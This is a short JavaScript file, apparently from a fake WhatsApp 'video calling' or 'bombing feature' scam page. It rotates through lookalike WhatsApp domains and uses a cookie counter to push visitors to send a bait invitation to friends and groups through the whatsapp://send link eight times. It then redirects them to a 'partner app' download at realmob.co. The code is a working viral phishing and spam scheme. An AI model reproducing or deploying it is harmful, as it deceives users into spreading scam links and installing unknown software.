var iOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
var ur="http://realmob.co/app.html";

var domains = ['whatsappvideoactivate.com', 'whatappvideoenable.com', 'whatappvideoonline.com', 'whatappvideofeature.com', 'whatappvideostart.com', 'whatsapp-videocalls.com', 'whatsapp.com.videocallenable.co', 'whatsapp.net.videocallenable.co', 'whatsapp.org.videocallenable.co'];
var selected = domains[Math.floor(Math.random() * domains.length)];
var domain = selected;
var share_event = domain;
console.log(domain);
if(iOS)
{
ur="http://realmob.co/app.html";
}



function setCookie(e,t,n)
{
var i=new Date;
i.setTime(i.getTime()+24*n*60*60*1e3)
;var o="expires="+i.toUTCString();
document.cookie=e+"="+t+"; "+o
}

function getCookie(e)
{for(var t=e+"=",n=document.cookie.split(";"),i=0;i<n.length;i++){for(var o=n[i];" "==o.charAt(0);)o=o.substring(1);if(0==o.indexOf(t))return o.substring(t.length,o.length)}return 0}
function fn1()
{
	var rand=Math.random() * 1000000;
	c=getCookie("invites");
	c++;
	shared(c);
	setCookie("invites",c,8);
	setTimeout(function(){ $("#counter").html(c); }, 2000);
	if(8>=c)
	{
		window.location.href='whatsapp://send?text=*You\'re invited to try Whatsapp Bombing feature.* %0D%0A%0D%0A Activate at: %0D%0A 👉 http://' + domain + '/ %0D%0A%0D%0A_Only people with the invitation can enable this feature_';
	}
	else
		window.location.href=ur;
}



function fn2()
{
	if(c>=8)
	{
		window.alert("ONE LAST STEP\n\nDownload partner app OR click YES on next page");
		window.location.href=ur;
	}
	else
		window.alert("Please Invite at least 4 friends and 4 groups to continue.\n\nYou have invited "+c);
}
var c=getCookie("invites");
if(c>=8)
{
	window.location.href=ur;
}
